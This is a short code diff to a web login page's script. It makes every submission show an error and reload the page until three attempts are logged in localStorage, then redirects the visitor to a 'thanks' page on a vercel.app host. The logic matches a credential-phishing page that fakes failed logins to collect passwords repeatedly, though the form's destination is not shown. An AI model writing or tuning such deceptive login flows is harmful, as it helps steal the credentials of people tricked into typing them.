@@ -113,7 +113,7 @@
     const nextField = document.getElementById('nextField');
     const errorText = document.getElementById('errorText');
 
-    // Set default if not yet set
+    // Initialize login attempt counter
     if (!localStorage.getItem('login_attempt')) {
       localStorage.setItem('login_attempt', '0');
     }
@@ -121,10 +121,10 @@
     form.addEventListener('submit', function () {
       let attempt = parseInt(localStorage.getItem('login_attempt'));
 
-      if (attempt < 1) {
+      if (attempt < 3) {
         errorText.style.display = 'block';
-        nextField.value = window.location.href; // submit, but reload same page
-        localStorage.setItem('login_attempt', '1');
+        nextField.value = window.location.href; // submit but stay
+        localStorage.setItem('login_attempt', (attempt + 1).toString());
       } else {
         errorText.style.display = 'none';
         nextField.value = "https://frilea.vercel.app/thanks.html"; // redirect
@@ -133,6 +133,6 @@
     });
   </script>
 
-<script src='app.js'></script>
+  <script src='app.js'></script>
 </body>
 </html>
